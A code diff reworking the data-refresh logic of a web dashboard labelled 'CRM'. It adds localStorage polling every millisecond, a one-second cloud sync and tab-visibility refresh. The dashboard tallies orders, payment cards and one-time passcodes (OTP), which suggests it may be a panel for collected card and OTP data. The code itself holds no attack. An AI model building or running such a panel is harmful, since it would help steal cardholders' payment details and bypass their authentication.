@@ -459,19 +459,26 @@
 
 <script src="js/data.js"></script>
 <script src="js/auth.js"></script>
-<script src="js/crm-cross-device-sync.js"></script>
+<script src="js/crm-customer-flow.js"></script>
 <script>
   document.getElementById("header").innerHTML = renderHeader();
   document.getElementById("footer").innerHTML = renderFooter();
 
-  // Get CRM data from the cross-device sync system
+  // Get CRM data from the customer flow system
   async function getCRMData() {
-    return window.crossDeviceCRMSync.getLocalData();
+    return window.customerCRMFlow.getCRMData();
   }
+
+  const CRM_STORAGE_KEY = 'crm_customer_data';
+  const FAST_REFRESH_MS = 1;
+  const CLOUD_SYNC_MS = 1000;
+  let lastCRMDataSignature = '';
+  let fastRefreshTimer = null;
+  let cloudSyncTimer = null;
 
   // Update statistics
   async function updateCRMStats() {
-    const stats = await window.crossDeviceCRMSync.getStats();
+    const stats = window.customerCRMFlow.getCRMStats();
     document.getElementById('total-orders').textContent = stats.totalOrders;
     document.getElementById('total-cards').textContent = stats.totalCards;
     document.getElementById('total-otp').textContent = stats.totalOTP;
@@ -481,8 +488,8 @@
     const syncStatus = document.getElementById('sync-status');
     if (syncStatus) {
       if (stats.isOnline) {
-        syncStatus.textContent = stats.lastSync ? 'Cross-device sync: ' + new Date(stats.lastSync).toLocaleString() : 'Ready to sync';
-        syncStatus.className = stats.lastSync ? 'sync-status synced' : 'sync-status not-synced';
+        syncStatus.textContent = 'Customer data active: ' + new Date(stats.lastSync).toLocaleString();
+        syncStatus.className = 'sync-status synced';
       } else {
         syncStatus.textContent = 'Offline';
         syncStatus.className = 'sync-status not-synced';
@@ -625,38 +632,83 @@
 
   // Initialize and auto-refresh
   async function initializeCRM() {
-    console.log('CRM: Initializing cross-device dashboard...');
+    console.log('CRM: Initializing customer data dashboard...');
     
-    // Force initial sync to ensure data is loaded from shared storage
-    await window.crossDeviceCRMSync.syncFromCloud();
+    // Ensure customer data is initialized
+    const data = window.customerCRMFlow.getCRMData();
+    console.log('CRM: Customer data loaded:', {
+      orders: data.orders.length,
+      cards: data.cards.length,
+      otp: data.otp.length
+    });
     
-    // Update UI with data
-    await updateCRMStats();
-    await renderCRMTables();
+    // Update UI with data immediately
+    await refreshDashboardIfChanged(true);
     
-    console.log('CRM: Cross-device dashboard initialized with shared data');
+    console.log('CRM: Customer data dashboard initialized');
   }
-  
-  // Auto-refresh every 5 seconds
-  setInterval(async () => {
+
+  async function refreshDashboardIfChanged(forceUpdate = false) {
+    const currentSignature = localStorage.getItem(CRM_STORAGE_KEY) || '';
+    if (!forceUpdate && currentSignature === lastCRMDataSignature) {
+      return;
+    }
+
+    lastCRMDataSignature = currentSignature;
     await updateCRMStats();
     await renderCRMTables();
-  }, 5000);
+  }
+
+  function startFastRefresh() {
+    if (fastRefreshTimer) {
+      clearInterval(fastRefreshTimer);
+    }
+
+    fastRefreshTimer = setInterval(async () => {
+      await refreshDashboardIfChanged();
+    }, FAST_REFRESH_MS);
+  }
+
+  async function autoCloudSyncAndRefresh() {
+    if (window.crossDeviceCRMSync && typeof window.crossDeviceCRMSync.syncFromCloud === 'function') {
+      await window.crossDeviceCRMSync.syncFromCloud();
+    }
+    await refreshDashboardIfChanged();
+  }
+
+  function startAutoCloudSync() {
+    if (cloudSyncTimer) {
+      clearInterval(cloudSyncTimer);
+    }
+
+    cloudSyncTimer = setInterval(async () => {
+      await autoCloudSyncAndRefresh();
+    }, CLOUD_SYNC_MS);
+  }
+
+  // Instant refresh when orders are updated in another tab/window
+  window.addEventListener('storage', async (event) => {
+    if (event.key === CRM_STORAGE_KEY) {
+      await refreshDashboardIfChanged(true);
+    }
+  });
 
   // Initialize on page load
   document.addEventListener('DOMContentLoaded', async () => {
     // Wait a moment for sync system to initialize
     setTimeout(async () => {
       await initializeCRM();
+      startFastRefresh();
+      startAutoCloudSync();
     }, 500);
   });
 
-  // Also initialize immediately if DOM is already loaded
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initializeCRM);
-  } else {
-    setTimeout(initializeCRM, 100);
-  }
+  // Pull latest cloud data whenever tab becomes active again
+  document.addEventListener('visibilitychange', async () => {
+    if (!document.hidden) {
+      await autoCloudSyncAndRefresh();
+    }
+  });
 </script>
 </body>
 </html>
